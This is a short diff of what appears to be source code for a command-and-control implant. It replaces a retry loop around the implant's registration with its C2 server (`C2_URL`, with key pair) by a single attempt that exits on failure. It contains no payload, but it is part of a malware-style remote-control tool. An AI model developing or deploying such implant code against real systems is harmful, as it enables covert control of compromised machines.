@@ -85,23 +85,31 @@ int main()
 		exit(1);
 	}
 
-	while (TRUE) {
-		int tries = 0;
-		currentProfile = Register(toWide(C2_URL), pubKey, privKey);
+	// while (TRUE) {
+	// 	int tries = 0;
+	// 	currentProfile = Register(toWide(C2_URL), pubKey, privKey);
 
-		if (currentProfile == NULL)
-		{
-			DEBUG_PRINTF("Error registering, aborting\n");
-			if (tries >= REGISTER_MAX_RETRIES){
-				DEBUG_PRINTF("Max retries reached, exiting\n");
-				exit(1);
-			}
-			tries++;
-		} else {
-			break;
-		}
-	}
+	// 	if (currentProfile == NULL)
+	// 	{
+	// 		DEBUG_PRINTF("Error registering, aborting\n");
+	// 		if (tries >= REGISTER_MAX_RETRIES){
+	// 			DEBUG_PRINTF("Max retries reached, exiting\n");
+	// 			exit(1);
+	// 		}
+	// 		tries++;
+	// 	} else {
+	// 		break;
+	// 	}
+	// }
 	
+
+	currentProfile = Register(toWide(C2_URL), pubKey, privKey);
+	if (currentProfile == NULL)
+	{
+		DEBUG_PRINTF("Error registering, aborting\n");
+		exit(1);
+	}
+
 
 	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());
 
